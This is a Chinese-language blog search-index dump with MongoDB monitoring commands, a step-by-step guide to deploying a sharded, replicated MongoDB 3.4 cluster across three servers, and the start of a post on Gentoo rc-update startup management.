&quot;pageheap_unmapped_bytes&quot; : 0, &quot;max_total_thread_cache_bytes&quot; : 1024458752, &quot;current_total_thread_cache_bytes&quot; : 367712, &quot;total_free_bytes&quot; : 1298448, &quot;central_cache_free_bytes&quot; : 181232, &quot;transfer_cache_free_bytes&quot; : 749504, &quot;thread_cache_free_bytes&quot; : 367712, &quot;aggressive_memory_decommit&quot; : 0, &quot;formattedString&quot; : &quot;--- ... ... &#125; &#125;, &quot;mem&quot; : &#123; &quot;bits&quot; : 64, &quot;resident&quot; : 11, &quot;virtual&quot; : 181, &quot;supported&quot; : true &#125;, &quot;ok&quot; : 1&#125; 1通过上面看到MongoDB的版本、后台刷写情况、副本集情况、操作数量情况、进出网络情况、连接数情况和内存(内存单位是M)情况。 查看服务器命令行参数123456789101112131415161718192021222324252627282930mongos&gt; db.serverCmdLineOpts()&#123; &quot;argv&quot; : [ &quot;mongos&quot;, &quot;-f&quot;, &quot;&#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;mongos.conf&quot; ], &quot;parsed&quot; : &#123; &quot;config&quot; : &quot;&#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;mongos.conf&quot;, &quot;net&quot; : &#123; &quot;bindIp&quot; : &quot;0.0.0.0&quot;, &quot;maxIncomingConnections&quot; : 20000, &quot;port&quot; : 20000 &#125;, &quot;processManagement&quot; : &#123; &quot;fork&quot; : true, &quot;pidFilePath&quot; : &quot;&#x2F;data&#x2F;A&#x2F;mongodb&#x2F;mongos&#x2F;mongos.pid&quot; &#125;, &quot;sharding&quot; : &#123; &quot;configDB&quot; : &quot;configs&#x2F;10.0.10.25:21000,10.0.10.26:21000,10.0.10.27:21000&quot; &#125;, &quot;systemLog&quot; : &#123; &quot;destination&quot; : &quot;file&quot;, &quot;logAppend&quot; : true, &quot;path&quot; : &quot;&#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongos&#x2F;mongos.log&quot; &#125; &#125;, &quot;ok&quot; : 1&#125; 查看数据库/表状态通过下面命令可以看到数据库的名称，集合（表）数量，索引数量、大小，数据文件大小，存储空间大小和物理文件大小。 1234567891011121314151617181920212223242526272829303132333435mongos&gt; db.stats()&#123; &quot;raw&quot; : &#123; &quot;shard1&#x2F;10.0.10.25:27001,10.0.10.26:27001&quot; : &#123; &quot;db&quot; : &quot;test&quot;, &quot;collections&quot; : 0, &quot;views&quot; : 0, &quot;objects&quot; : 0, &quot;avgObjSize&quot; : 0, &quot;dataSize&quot; : 0, #数据文件大小,单位:M &quot;storageSize&quot; : 0, #存储空间大小：datasize+集合两端预留的未使用空间 &quot;numExtents&quot; : 0, &quot;indexes&quot; : 0, &quot;indexSize&quot; : 0, &quot;fileSize&quot; : 0, #物理文件大小:包括分配 &quot;ok&quot; : 1, &quot;$gleStats&quot; : &#123; &quot;lastOpTime&quot; : Timestamp(0, 0), &quot;electionId&quot; : ObjectId(&quot;7fffffff0000000000000002&quot;) &#125; &#125;, &quot;objects&quot; : 0, &quot;avgObjSize&quot; : 0, &quot;dataSize&quot; : 0, &quot;storageSize&quot; : 0, &quot;numExtents&quot; : 0, &quot;indexes&quot; : 0, &quot;indexSize&quot; : 0, &quot;fileSize&quot; : 0, &quot;extentFreeList&quot; : &#123; &quot;num&quot; : 0, &quot;totalSize&quot; : 0 &#125;, &quot;ok&quot; : 1&#125; 查看当前Query队列执行情况1234567891011121314151617181920212223242526272829303132mongos&gt; db.currentOP();&#123; &quot;inprog&quot; : [ &#123; &quot;desc&quot; : &quot;conn4732&quot;, #可与日志信息联系起来 &quot;threadId&quot; : &quot;0x33903c0&quot;, &quot;connectionId&quot; : 4732, #连接ID &quot;opid&quot; : 221672, #操作标识，可以用这个ID来终止该操作：db.killOP(opid) &quot;active&quot; : true, #表示线程是否在运行 &quot;secs_running&quot; : 4, #执行的时间 &quot;microsecs_running&quot; : NumberLong(4999899), &quot;op&quot; : &quot;getmore&quot;, #操作类型：插入、删除、更新、查询 &quot;ns&quot; : &quot;local.oplog.rs&quot;, #操作的集合 &quot;query&quot; : &#123; &quot;ts&quot; : &#123; &quot;$gte&quot; : Timestamp(1435674461, 1) &#125; &#125;, &quot;client&quot; : &quot;127.0.0.1:52101&quot;, &quot;numYields&quot; : 0, #表示该操作交出锁，而使其他操作得以运行。 &quot;locks&quot; : &#123; #锁信息 &#125;, &quot;waitingForLock&quot; : false, &quot;lockStats&quot; : &#123; &quot;Global&quot; : &#123; &quot;acquireCount&quot; : &#123; &quot;r&quot; : NumberLong(10) &#125; &#125;, &#125; &#125; 123456789101112131415161718192021222324252627282930313233通过上面看到当前执行的进程，类似MySQL的show processlist。可以添加过滤条件：mongos&gt; db.currentOP(&#123;&quot;ns&quot;:&quot;test&quot;&#125;)&#123; &quot;raw&quot; : &#123; &quot;shard1&#x2F;10.0.10.25:27001,10.0.10.26:27001&quot; : &#123; &quot;inprog&quot; : [ ], &quot;ok&quot; : 1, &quot;$gleStats&quot; : &#123; &quot;lastOpTime&quot; : Timestamp(0, 0), &quot;electionId&quot; : ObjectId(&quot;7fffffff0000000000000002&quot;) &#125; &#125;, &quot;shard2&#x2F;10.0.10.26:27002,10.0.10.27:27002&quot; : &#123; &quot;inprog&quot; : [ ], &quot;ok&quot; : 1, &quot;$gleStats&quot; : &#123; &quot;lastOpTime&quot; : Timestamp(0, 0), &quot;electionId&quot; : ObjectId(&quot;7fffffff0000000000000001&quot;) &#125; &#125;, &quot;shard3&#x2F;10.0.10.25:27003,10.0.10.27:27003&quot; : &#123; &quot;inprog&quot; : [ ], &quot;ok&quot; : 1, &quot;$gleStats&quot; : &#123; &quot;lastOpTime&quot; : Timestamp(0, 0), &quot;electionId&quot; : ObjectId(&quot;7fffffff0000000000000002&quot;) &#125; &#125; &#125;, &quot;inprog&quot; : [ ], &quot;ok&quot; : 1&#125; 监控MongoDB各个状态mongotop123mongos不支持mongotop，所以不能使用如下命令查看mongotop --port 200002018-02-22T22:52:37.486-0500 cannot run mongotop against a mongos 123456789101112131415连接到shard1分片查看哪几个数据库最繁忙[root@bogon conf]# mongotop --port 270012018-02-22T22:50:29.489-0500 connected to: 127.0.0.1:27001 ns total read write 2018-02-22T22:50:30-05:00 local.oplog.rs 2ms 2ms 0ms admin.system.indexes 0ms 0ms 0ms admin.system.roles 0ms 0ms 0ms admin.system.version 0ms 0ms 0ms local.me 0ms 0ms 0ms local.replset.election 0ms 0ms 0ms local.replset.minvalid 0ms 0ms 0ms local.startup_log 0ms 0ms 0ms local.system.replset 0ms 0ms 0ms testdb.system.indexes 0ms 0ms 0ms mongostat12345mongostat连接到mongos路由上查询mongostat --port 20000 mongostat加上--discover 可以查看到副本集和分片集群的所有成员状态mongostat --port 20000 --discover 1234567891011121314insert、query、update、delete、getmore、command 每种对应操作的发生次数。其中faults表示访问失败数，数据从内存交换出去，放到swap。值越小越好，最好不要大于100。参数解释:flushes：表示刷写到磁盘的次数。mapped：表示映射到内存的数量，约等于数据目录大小。vsize：表示正在使用的虚拟内存大小，通常为数据目录的2倍。（一次用于映射，一次用于日志系统）res：表示正在使用的内存大小。qr|qw：表示读写操作队列大小，即有多少读写操作被阻塞，等待进行处理。ar|aw：表示活动客户端的数量，即正在进行读写操作的客户端。netId：表示通过网络传输进来的字节数。netou：t表示通过网络传输出的字节数。Conn：表示服务器打开的连接数。time：表示统计的时间。 MongoDB日志分割123456mongos&gt; db.adminCommand(&#123;&quot;logRotate&quot;:1&#125;)&#123; &quot;ok&quot; : 1 &#125;mongos&gt; mongos&gt;类似MySQL的flush logs; 命令 刷写并锁1234567891011mongos&gt; db.currentOP() #查看锁情况刷写到磁盘，并锁住数据库。此时数据库只能读，不能写。保证了数据的一致性，在此可以进行复制文件或则快照备份mongos&gt; db.fsyncLock() 解锁mongos&gt; db.fsyncUnlock()注：mongos路由不支持，报错如下:&#123; &quot;err&quot; : &quot;can&#39;t do unlock through mongos&quot; &#125; 备份还原搜索参考另一篇文章：MongoDB 备份与恢复","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"Mongo","slug":"Mongo","permalink":"https://garywu520.github.io/tags/Mongo/"},{"name":"数据库管理","slug":"数据库管理","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/"}]},{"title":"高可用MongoDB集群","slug":"高可用MongoDB集群","date":"2018-02-22T05:43:33.000Z","updated":"2018-02-23T03:08:57.370Z","comments":true,"path":"2018/02/22/高可用MongoDB集群/","link":"","permalink":"https://garywu520.github.io/2018/02/22/%E9%AB%98%E5%8F%AF%E7%94%A8MongoDB%E9%9B%86%E7%BE%A4/","excerpt":"MongoDB是最易用的NoSQL，比较适合取代MySQL做一些存储，不过不是强一致性的。本章节主要分享高可用分片+副本集部署。从下图中可以看到有四个组件：mongos、config server、shard、replica set。","text":"MongoDB是最易用的NoSQL，比较适合取代MySQL做一些存储，不过不是强一致性的。本章节主要分享高可用分片+副本集部署。从下图中可以看到有四个组件：mongos、config server、shard、replica set。 mongos1mongos，数据库集群请求的入口，所有的请求都通过mongos进行协调，不需要在应用程序添加一个路由选择器，mongos自己就是一个请求分发中心，它负责把对应的数据请求请求转发到对应的shard服务器上。在生产环境通常有多mongos作为请求的入口，防止其中一个挂掉所有的mongodb请求都没有办法操作。 config server1config server，顾名思义为配置服务器，存储所有数据库元信息（路由、分片）的配置。mongos本身没有物理存储分片服务器和数据路由信息，只是缓存在内存里，配置服务器则实际存储这些数据。mongos第一次启动或者关掉重启就会从 config server 加载配置信息，以后如果配置服务器信息变化会通知到所有的 mongos 更新自己的状态，这样 mongos 就能继续准确路由。在生产环境通常有多个 config server 配置服务器，因为它存储了分片路由的元数据，防止数据丢失！ shard1shard，分片（sharding）是指将数据库拆分，将其分散在不同的机器上的过程。将数据分散到不同的机器上，不需要功能强大的服务器就可以存储更多的数据和处理更大的负载。基本思想就是将集合切成小块，这些块分散到若干片里，每个片只负责总数据的一部分，最后通过一个均衡器来对各个分片进行均衡（数据迁移）。 replica set1replica set，中文翻译副本集，其实就是shard的备份，防止shard挂掉之后数据丢失。复制提供了数据的冗余备份，并在多个服务器上存储数据副本，提高了数据的可用性， 并可以保证数据的安全性。 仲裁者1仲裁者（Arbiter），是复制集中的一个MongoDB实例，它并不保存数据。仲裁节点使用最小的资源并且不要求硬件设备，不能将Arbiter部署在同一个数据集节点中，可以部署在其他应用服务器或者监视服务器中，也可部署在单独的虚拟机中。为了确保复制集中有奇数的投票成员（包括primary），需要添加仲裁节点做为投票，否则primary不能运行时不会自动切换primary。 架构原理-总结1简单了解之后，我们可以这样总结一下，应用请求mongos来操作mongodb的增删改查，配置服务器存储数据库元信息，并且和mongos做同步，数据最终存入在shard（分片）上，为了防止数据丢失同步在副本集中存储了一份，仲裁在数据存储到分片的时候决定存储到哪个节点。 环境准备123操作系统: CentOS7.2服务器: 3台 - 10.0.10.25&#x2F;26&#x2F;27Mongo版本： 3.4.6(mongodb-linux-x86_64-3.4.6.tgz) 服务器规划 服务器25 服务器26 服务器27 mongos mongos mongos config server config server config server shard server1主节点 shard server1副节点 shard server1仲裁节点 shard server2仲裁节点 shard server2主节点 shard server2副节点 shard server3主节点 shard server3仲裁节点 shard server3副节点 端口分配 mongos config server shard server1 shard server2 shard server3 20000 21000 27001 27002 27003 集群部署安装MongoDB12345678mongodb3.4.6下载: https:&#x2F;&#x2F;www.mongodb.org&#x2F;dl&#x2F;linux&#x2F;x86_64解压到&#x2F;usr&#x2F;localtar -zxvf mongodb-linux-x86_64-3.4.6.tgz -C &#x2F;usr&#x2F;local&#x2F;软链ln -sv &#x2F;usr&#x2F;local&#x2F;mongodb-linux-x86_64-3.4.6 &#x2F;usr&#x2F;local&#x2F;mongodbls -lh &#x2F;usr&#x2F;local&#x2F;mongodb 分别在每台服务器建立conf、mongos、config、shard1、shard2、shard3六个目录 1234567891011121314注: 因为mongos不存储数据, 所以此处建立mongos目录用于存放pid。mkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;confmkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;mongos #只用来存放pidmkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;config&#x2F;datamkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard1&#x2F;datamkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard2&#x2F;datamkdir -p &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard3&#x2F;datamkdir -p &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongosmkdir -p &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;configmkdir -p &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard1mkdir -p &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard2mkdir -p &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard3 配置环境变量 1234567cat &gt;&gt; &#x2F;etc&#x2F;profile &lt;&lt;EOFexport MONGODB_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;mongodbexport PATH&#x3D;$PATH:$MONGODB_HOME&#x2F;binEOF使其生效source &#x2F;etc&#x2F;profile config server配置(3台机器)1注: mongodb3.4及以后要求config server也需要创建副本集,否则集群部署不成功 3台服务器-分别添加配置文件 1vi &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;config.conf 123456789101112131415161718## 配置文件内容pidfilepath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;config&#x2F;configsvr.piddbpath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;config&#x2F;datalogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;config&#x2F;congigsvr.loglogappend &#x3D; true bind_ip &#x3D; 0.0.0.0port &#x3D; 21000fork &#x3D; true #声明这是一个DB(config server)集群的配置configsvr &#x3D; true#副本集名称(稍后初始化副本集需要使用)replSet&#x3D;configs #设置最大连接数maxConns&#x3D;20000 启动3台服务器的config server 123456789启动mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;config.conf 验证端口[root@bogon ~]# ss -lntup |grep 21000tcp LISTEN 0 128 *:21000 *:* users:((&quot;mongod&quot;,pid&#x3D;2149,fd&#x3D;7))验证日志[root@bogon ~]# tailf &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;config&#x2F;congigsvr.log 登陆任意一台配置服务器,初始化配置副本集 1234567891011121314151617#连接mongo config servermongo --port 21000#config变量config &#x3D; &#123;... _id: &quot;configs&quot;,... members : [... &#123;_id : 0,host : &quot;10.0.10.25:21000&quot;&#125;, #格式:IP:Port... &#123;_id : 1,host : &quot;10.0.10.26:21000&quot;&#125;,... &#123;_id : 2,host : &quot;10.0.10.27:21000&quot;&#125;... ]... &#125;#初始化副本集(初始化完成后, “&gt;”变成了“configs:SECONDARY&gt;”)&gt; rs.initiate(config)&#123; &quot;ok&quot; : 1 &#125;configs:SECONDARY&gt; 其中, _id: “configs”应与配置文件中配置的副本集名称[replSet=configs]一致; 配置分片副本集(3台机器)设置第一个分片副本集1vim &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard1.conf 123456789101112131415161718192021pidfilepath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard1&#x2F;shard1.piddbpath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard1&#x2F;datalogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard1&#x2F;shard1.loglogappend &#x3D; truebind_ip &#x3D; 0.0.0.0port &#x3D; 27001fork &#x3D; true #打开web监控(端口默认28001)httpinterface&#x3D;truerest&#x3D;true #副本集名称replSet&#x3D;shard1 #声明这是一个DB(分片副本)集群的配置shardsvr &#x3D; true #设置最大连接数maxConns&#x3D;20000 分别启动3台机器的shard1 server 123456789启动mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard1.conf验证端口[root@bogon ~]# ss -lntup |grep 27001tcp LISTEN 0 128 *:27001 *:* users:((&quot;mongod&quot;,pid&#x3D;2649,fd&#x3D;7))验证日志[root@bogon ~]# tailf &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard 在非仲裁服务器,初始化shard1副本集 1234567891011121314151617181920连接mongo --port 27001使用admin数据库(没有则创建)use admin定义副本集配置, 第三个节点的“arbiterOnly”:true 代表其为仲裁节点&gt; config &#x3D; &#123;... _id:&quot;shard1&quot;,... members: [... &#123;_id:0, host:&quot;10.0.10.25:27001&quot;&#125;,... &#123;_id:1, host:&quot;10.0.10.26:27001&quot;&#125;,... &#123;_id:2, host:&quot;10.0.10.27:27001&quot;, arbiterOnly:true&#125;... ]... &#125;初始化副本集配置&gt; rs.initiate(config);&#123; &quot;ok&quot; : 1 &#125;shard1:SECONDARY&gt; shard1 Web监控 1234567891011121314注: 配置文件中启用了Web监控,如何访问呢？ss -lntup |grep mongotcp LISTEN 0 128 *:21000 *:* users:((&quot;mongod&quot;,pid&#x3D;18173,fd&#x3D;7))tcp LISTEN 0 128 *:27001 *:* users:((&quot;mongod&quot;,pid&#x3D;18265,fd&#x3D;7))tcp LISTEN 0 128 *:28001 *:* users:((&quot;mongod&quot;,pid&#x3D;18265,fd&#x3D;9))可以看到, 端口多出来一个28001Web访问： http:&#x2F;&#x2F;10.0.10.25:28001 http:&#x2F;&#x2F;10.0.10.26:28001 http:&#x2F;&#x2F;10.0.10.27:28001 查看shard1副本集状态: http:&#x2F;&#x2F;10.0.10.25:28001&#x2F;_replSet 设置第二个分片副本集1vim &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard2.conf 123456789101112131415161718192021pidfilepath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard2&#x2F;shard2.piddbpath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard2&#x2F;datalogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard2&#x2F;shard2.loglogappend &#x3D; truebind_ip &#x3D; 0.0.0.0port &#x3D; 27002fork &#x3D; true #打开web监控httpinterface&#x3D;truerest&#x3D;true #副本集名称replSet&#x3D;shard2 #声明这是一个DB(分片副本)集群的配置shardsvr &#x3D; true #设置最大连接数maxConns&#x3D;20000 分别启动3台机器的shard2 server 12345678910111213启动shard2mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard2.conf端口验证[root@bogon ~]# ss -lntup |grep mongotcp LISTEN 0 128 *:21000 *:* users:((&quot;mongod&quot;,pid&#x3D;2326,fd&#x3D;7))tcp LISTEN 0 128 *:27001 *:* users:((&quot;mongod&quot;,pid&#x3D;2649,fd&#x3D;7))tcp LISTEN 0 128 *:27002 *:* users:((&quot;mongod&quot;,pid&#x3D;2755,fd&#x3D;7))tcp LISTEN 0 128 *:28001 *:* users:((&quot;mongod&quot;,pid&#x3D;2649,fd&#x3D;9))tcp LISTEN 0 128 *:28002 *:* users:((&quot;mongod&quot;,pid&#x3D;2755,fd&#x3D;9))日志验证tailf &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard2&#x2F;shard2.log 在非仲裁服务器，初始化shard2副本集 1234567891011121314151617181920连接mongo --port 27002使用admin数据库use admin定义副本集配置, 第三个节点的“arbiterOnly”:true 代表其为仲裁节点&gt; config &#x3D; &#123;... _id:&quot;shard2&quot;,... members: [... &#123;_id:0, host:&quot;10.0.10.25:27002&quot;,arbiterOnly:true&#125;,... &#123;_id:1, host:&quot;10.0.10.26:27002&quot;&#125;,... &#123;_id:2, host:&quot;10.0.10.27:27002&quot;&#125;... ]... &#125;初始化副本集配置&gt; rs.initiate(config);&#123; &quot;ok&quot; : 1 &#125;shard2:SECONDARY&gt; shard2 Web监控 1234567Web访问： http:&#x2F;&#x2F;10.0.10.25:28002 http:&#x2F;&#x2F;10.0.10.26:28002 http:&#x2F;&#x2F;10.0.10.27:28002 查看shard2副本集状态: http:&#x2F;&#x2F;10.0.10.25:28002&#x2F;_replSet 设置第三个分片副本集1vim &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard3.conf 123456789101112131415161718192021pidfilepath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard3&#x2F;shard3.piddbpath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;shard3&#x2F;datalogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard3&#x2F;shard3.loglogappend &#x3D; truebind_ip &#x3D; 0.0.0.0port &#x3D; 27003fork &#x3D; true #打开web监控httpinterface&#x3D;truerest&#x3D;true #副本集名称replSet&#x3D;shard3 #声明这是一个DB(分片副本)集群的配置shardsvr &#x3D; true #设置最大连接数maxConns&#x3D;20000 分别启动3台机器的shard3 server 123456789101112131415启动shard3mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard3.conf端口验证[root@bogon ~]# ss -lntup |grep mongotcp LISTEN 0 128 *:21000 *:* users:((&quot;mongod&quot;,pid&#x3D;2326,fd&#x3D;7))tcp LISTEN 0 128 *:27001 *:* users:((&quot;mongod&quot;,pid&#x3D;2649,fd&#x3D;7))tcp LISTEN 0 128 *:27002 *:* users:((&quot;mongod&quot;,pid&#x3D;2755,fd&#x3D;7))tcp LISTEN 0 128 *:27003 *:* users:((&quot;mongod&quot;,pid&#x3D;2827,fd&#x3D;7))tcp LISTEN 0 128 *:28001 *:* users:((&quot;mongod&quot;,pid&#x3D;2649,fd&#x3D;9))tcp LISTEN 0 128 *:28002 *:* users:((&quot;mongod&quot;,pid&#x3D;2755,fd&#x3D;9))tcp LISTEN 0 128 *:28003 *:* users:((&quot;mongod&quot;,pid&#x3D;2827,fd&#x3D;9))日志验证tailf &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;shard3&#x2F;shard3.log 在非仲裁服务器，初始化shard3副本集 1234567891011121314151617181920连接mongo --port 27003使用admin数据库use admin定义副本集配置, 第三个节点的“arbiterOnly”:true 代表其为仲裁节点&gt; config &#x3D; &#123;... _id:&quot;shard3&quot;,... members: [... &#123;_id:0, host:&quot;10.0.10.25:27003&quot;&#125;,... &#123;_id:1, host:&quot;10.0.10.26:27003&quot;,arbiterOnly:true&#125;,... &#123;_id:2, host:&quot;10.0.10.27:27003&quot;&#125;... ]... &#125;初始化副本集配置&gt; rs.initiate(config);&#123; &quot;ok&quot; : 1 &#125;shard3:SECONDARY&gt; shard3 Web监控 1234567Web访问： http:&#x2F;&#x2F;10.0.10.25:28003 http:&#x2F;&#x2F;10.0.10.26:28003 http:&#x2F;&#x2F;10.0.10.27:28003 查看shard3副本集状态: http:&#x2F;&#x2F;10.0.10.25:28003&#x2F;_replSet 配置路由服务 mongos先启动配置服务器和分片服务器,后启动路由实例（三台机器） 1vim &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;mongos.conf 12345678910111213pidfilepath &#x3D; &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;mongos&#x2F;mongos.pidlogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongos&#x2F;mongos.loglogappend &#x3D; truebind_ip &#x3D; 0.0.0.0port &#x3D; 20000fork &#x3D; true#监听的配置服务器,只能有1个或者3个 configs为配置服务器的副本集名字configdb &#x3D; configs&#x2F;10.0.10.25:21000,10.0.10.26:21000,10.0.10.27:21000 #设置最大连接数maxConns&#x3D;20000 启用3台服务器的mongos 123456789启动(启动命令为mongos)mongos -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;mongos.conf验证端口[root@bogon ~]# ss -lntup |grep mongostcp LISTEN 0 128 *:20000 *:* users:((&quot;mongos&quot;,pid&#x3D;2933,fd&#x3D;5))验证日志tailf &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongos&#x2F;mongos.log 启用分片1目前已经成功部署了mongodb配置服务器、路由服务器，各个分片服务器，此时当应用程序连接到mongos路由服务器时并不能使用分片机制，还需要在程序里设置分片配置，让分片生效。 登陆任意一台mongos 12345678910111213连接mongosmongo --port 20000使用admin数据库use admin串联路由服务器与分配副本集sh.addShard(&quot;shard1&#x2F;10.0.10.25:27001,10.0.10.26:27001,10.0.10.27:27001&quot;)sh.addShard(&quot;shard2&#x2F;10.0.10.25:27002,10.0.10.26:27002,10.0.10.27:27002&quot;)sh.addShard(&quot;shard3&#x2F;10.0.10.25:27003,10.0.10.26:27003,10.0.10.27:27003&quot;)查看集群状态sh.status() 指定数据库自动分片及测试1目前配置服务、路由服务、分片服务、副本集服务都已经串联起来了，但我们的目的是希望插入数据，数据能够自动分片。连接在mongos上，准备让指定的数据库、指定的集合分片生效。 1234567891011连接mongosmongo --port 20000切换到adminuse admin#指定testdb分片生效db.runCommand( &#123; enablesharding :&quot;testdb&quot;&#125;);#指定数据库里需要分片的集合和片键db.runCommand( &#123; shardcollection : &quot;testdb.table1&quot;,key : &#123;id: 1&#125; &#125; ) 1我们设置testdb的 table1表需要分片，根据 id 自动分片到 shard1 ，shard2，shard3 上面去。要这样设置是因为不是所有mongodb 的数据库和表 都需要分片！ 报错处理 1234567注:如果不切换到admin则会报错mongos&gt; db.runCommand(&#123;enablesharding:&quot;test&quot;&#125;); &#123; &quot;ok&quot; : 0, &quot;errmsg&quot; : &quot;enableSharding may only be run against the admin database.&quot;, &quot;code&quot; : 13 &#125; 测试分片配置结果 1234567891011连接任意一个mongosmongo mongo 10.0.10.25:20000使用testdbuse testdb;插入测试数据mongos&gt; db.table1.insert(&#123;id:1,&quot;test1&quot;:&quot;testval1&quot;&#125;);mongos&gt; db.table1.insert(&#123;id:2,&quot;test1&quot;:&quot;testval1&quot;&#125;);mongos&gt; db.table1.insert(&#123;id:4,&quot;test1&quot;:&quot;testval1&quot;&#125;);WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) 查看分片情况如下，部分无关信息省掉了 123456789101112131415161718192021222324252627282930313233343536373839404142db.table1.stats();&#123; &quot;sharded&quot; : true, &quot;ns&quot; : &quot;testdb.table1&quot;, &quot;count&quot; : 100000, &quot;numExtents&quot; : 13, &quot;size&quot; : 5600000, &quot;storageSize&quot; : 22372352, &quot;totalIndexSize&quot; : 6213760, &quot;indexSizes&quot; : &#123; &quot;_id_&quot; : 3335808, &quot;id_1&quot; : 2877952 &#125;, &quot;avgObjSize&quot; : 56, &quot;nindexes&quot; : 2, &quot;nchunks&quot; : 3, &quot;shards&quot; : &#123; &quot;shard1&quot; : &#123; &quot;ns&quot; : &quot;testdb.table1&quot;, &quot;count&quot; : 42183, &quot;size&quot; : 0, ... &quot;ok&quot; : 1 &#125;, &quot;shard2&quot; : &#123; &quot;ns&quot; : &quot;testdb.table1&quot;, &quot;count&quot; : 38937, &quot;size&quot; : 2180472, ... &quot;ok&quot; : 1 &#125;, &quot;shard3&quot; : &#123; &quot;ns&quot; : &quot;testdb.table1&quot;, &quot;count&quot; :18880, &quot;size&quot; : 3419528, ... &quot;ok&quot; : 1 &#125; &#125;, &quot;ok&quot; : 1&#125; 后期运维123456789mongodb的启动顺序: (先启动)配置服务器 --&gt;再启动分片 --&gt; 最后启动mongos.mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;config.confmongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard1.confmongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard2.confmongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard3.confmongos -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;mongos.conf建议使用supervisor管理启动mongodb 参考：mongodb3.4集群部署","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"高可用","slug":"高可用","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"Mongo","slug":"Mongo","permalink":"https://garywu520.github.io/tags/Mongo/"},{"name":"路由","slug":"路由","permalink":"https://garywu520.github.io/tags/%E8%B7%AF%E7%94%B1/"},{"name":"分片","slug":"分片","permalink":"https://garywu520.github.io/tags/%E5%88%86%E7%89%87/"},{"name":"副本集","slug":"副本集","permalink":"https://garywu520.github.io/tags/%E5%89%AF%E6%9C%AC%E9%9B%86/"}]},{"title":"gentoo rc-update启动项自启管理","slug":"gentoo-rc-update启动项管理","date":"2018-02-16T01:03:11.000Z","updated":"2018-08-13T02:04:27.346Z","comments":true,"path":"2018/02/16/gentoo-rc-update启动项管理/","link":"","permalink":"https://garywu520.github.io/2018/02/16/gentoo-rc-update%E5%90%AF%E5%8A%A8%E9%A1%B9%E7%AE%A1%E7%90%86/","excerpt":"1234567Gentoo的init配置文件也&#x2F;etc&#x2F;inittab, 在该文件中前三行：id:3:initdefault:si::sysinit:&#x2F;sbin&#x2F;rc sysinitrc::bootwait:&#x2F;sbin&#x2F;rc boot第一行:指定gentoo的默认运行级别是3，接下来两行表明gentoo的runlevel首先开始于sysinit，接着是boot。Gentoo使用字符串，而非简单的数字标记运行级，有sysinit, boot, default, nonetwork, single, shutdown六个runlevel，简单明了。","text":"1234567Gentoo的init配置文件也&#x2F;etc&#x2F;inittab, 在该文件中前三行：id:3:initdefault:si::sysinit:&#x2F;sbin&#x2F;rc 